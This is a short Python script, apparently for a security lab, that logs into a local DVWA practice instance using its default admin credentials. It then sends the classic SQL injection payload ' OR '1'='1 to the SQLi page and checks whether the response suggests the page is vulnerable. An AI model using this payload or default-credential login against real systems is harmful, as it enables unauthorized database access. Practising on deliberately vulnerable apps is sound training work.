import requests
from bs4 import BeautifulSoup


DVWA_URL = "http://localhost:8080"


session = requests.Session()


def login_dvwa():

    login_url = DVWA_URL + "/login.php"

    r = session.get(login_url)

    soup = BeautifulSoup(r.text, "html.parser")

    token = soup.find("input", {"name": "user_token"})

    user_token = token["value"] if token else ""

    payload = {
        "username": "admin",
        "password": "password",
        "Login": "Login",
        "user_token": user_token
    }

    response = session.post(
        login_url,
        data=payload
    )

    success = "Logout" in response.text

    return success


def test_basic_sqli():

    target = DVWA_URL + "/vulnerabilities/sqli/"

    payload = "' OR '1'='1"

    r = session.get(
        target,
        params={"id": payload, "Submit": "Submit"}
    )

    indicators = [
        "Surname",
        "First name",
        "ID"
    ]

    vulnerable = any(
        x.lower() in r.text.lower()
        for x in indicators
    )

    return {
        "status": r.status_code,
        "possible_sqli": vulnerable
    }


if __name__ == "__main__":

    print("\nLogging into DVWA...")

    if login_dvwa():

        print("Login successful")

        result = test_basic_sqli()

        print("\nSQLi Test")
        print(result)

    else:

        print("DVWA login failed")
